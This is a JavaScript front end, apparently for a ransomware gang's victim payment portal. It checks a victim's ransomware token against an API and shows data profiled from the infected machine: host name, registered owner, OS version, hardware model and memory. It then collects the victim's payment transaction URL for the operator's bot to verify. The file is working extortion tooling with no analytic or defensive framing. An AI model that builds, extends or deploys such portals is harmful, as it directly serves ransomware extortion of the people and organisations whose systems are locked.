var token = document.querySelector(".token")
var clicker = document.querySelector(".clicker")
var verifyBtn = document.querySelector(".verify-btn")
var title = document.querySelector(".h-title")
var no = document.querySelector(".no")

let confirm;
confirm = false
let token_id;

function addItemToDOMS(head, text) {
  var list = document.querySelector(".list")

  var item = document.createElement('div')
  item.classList.add('card')
  item.classList.add('bg-primary')
  item.classList.add('mb-3')
  item.classList.add('text-white')

  var items = document.createElement('div')
  items.classList.add('card-header')
  items.innerHTML = head;

  var texts = document.createElement('div')
  texts.classList.add('card-body')
  texts.innerHTML = text;

  item.appendChild(items);
  item.appendChild(texts);

  list.insertBefore(item, list.childNodes[-1]);
}

function clock(){
  if (token.value.length == 8 && confirm == false) {
    token_id = token.value
    clicker.click()
    $.ajax({
      method: "GET",
      url: "/api/check",
      data: {
        "token": token_id,
      },
      // datatype: "dataType",
      success: function (response) {
        if (response.res=="success"){
          addItemToDOMS("host name", response.host_name)
          addItemToDOMS("registered owner", response.registered_owner)
          addItemToDOMS("os name", response.os_name)
          addItemToDOMS("os version", response.os_version)
          addItemToDOMS("system Boot Time", response.system_Boot_Time)
          addItemToDOMS("system Manufacturer", response.system_Manufacturer)
          addItemToDOMS("system Model", response.system_Model)
          addItemToDOMS("system Type", response.system_Type)
          addItemToDOMS("total Physical Memory", response.total_Physical_Memory)
        }
        else {
          no.click()
          Swal.fire(
         'Error',
          "Invalid Token Id",
          'error'
          )
          no.click()
        }
      },
      error: function (e) {
        no.click()
        Swal.fire(
         'Error',
          e.statusText,
          'warning'
        )
        no.click()
      }
    })
    token.value = ""
  }
  if (token.value.length > 0){
    verifyBtn.classList.remove("disabled")
  }
  else {
    if (!verifyBtn.classList.contains("disabled")) {
      verifyBtn.classList.add("disabled")
    }
  }
}

var countdown = setInterval(clock, 10)

function negative(){
  token.value = ""
  title.innerText = "Enter A valid token Id at the payment session on the ransomware"
}

function positive() {
  confirm = true
  token.value = ""
  title.innerText = "Enter the transaction url you copied for verification"
  verifyBtn.classList.remove("hidden")
  verifyBtn.classList.add("disabled")
}

function confirms() {
  $.ajax({
      method: "GET",
      url: "/api/send",
      data: {
        "token": token_id,
        "sender_id": token.value,
    },
      // datatype: "dataType",
      success: function (response) {
       if (response.status){
          Swal.fire(
         'Success',
          "The sender Id was submitted successfully, verification is pending until our bot review it.",
          'Success'
        )
       }
       token.value = ""
      },
      error: function (e) {
        no.click()
        Swal.fire(
         'Error',
          e.statusText,
          'warning'
        )
        token.value = ""
        no.click()
      }
    })
}